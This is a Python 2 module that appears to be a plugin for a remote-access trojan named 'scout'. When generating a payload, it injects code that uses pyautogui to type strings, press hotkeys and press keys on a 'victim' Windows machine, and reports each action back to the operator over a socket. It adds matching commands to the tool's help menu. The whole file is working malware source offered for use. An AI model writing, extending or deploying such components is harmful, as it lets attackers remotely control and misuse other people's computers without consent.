# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import pyautogui')
        config.functions.append('''
def inject_keystokes(args):
    command = args.split(' ',1)[0]
    injecting = args.split(' ',1)[1]
    if command == "inj_t":
        pyautogui.typewrite(injecting)
        s.sendall('[+]Injected keystrokes : ' + injecting)
    elif command == "inj_h":
        injecting = injecting.split(' ')
        for i in injecting:
            pyautogui.keyDown(i)
        for i in reversed(injecting):
            pyautogui.keyUp(i)
        s.sendall('[+]Injected hotkeys : ' + ' '.join(injecting))
    elif command == "inj_p":
        pyautogui.press(injecting)
        s.sendall('[+]Injected button press : ' + injecting)
''')
        config.logics.append('''
            elif command in ("inj_t","inj_h","inj_p"):
                inject_keystokes(data)''')
        config.help_menu['inj_t <string to inject as typing>'] = 'Inject a string through keystrokes that mimic typing'
        config.help_menu[
            'inj_h <hotkey combination to inject>'] = 'Inject a hotkey combination through keystrokes that mimic button presses'
        config.help_menu[
            'inj_p <button to inject as a press>'] = 'Inject a single key press through keystrokes that mimic button presses'
        config.help_menu['inj_valid'] = 'List all the valid keys the user can inject into the victim'
    elif option == 'info':
        print '\nName             : Inject Keystroke components' \
              '\nOS               : Windows' \
              '\nRequired Modules : pyautogui (External)' \
              '\nCommands         : inj_t <string to inject as typing>, inj_h <hotkey combination to inject>, inj_p <button to inject as a press>' \
              '\nDescription      : Allows for scout to inject keystrokes into victim, just as if it were being typed, through generating global keyboard events\n'
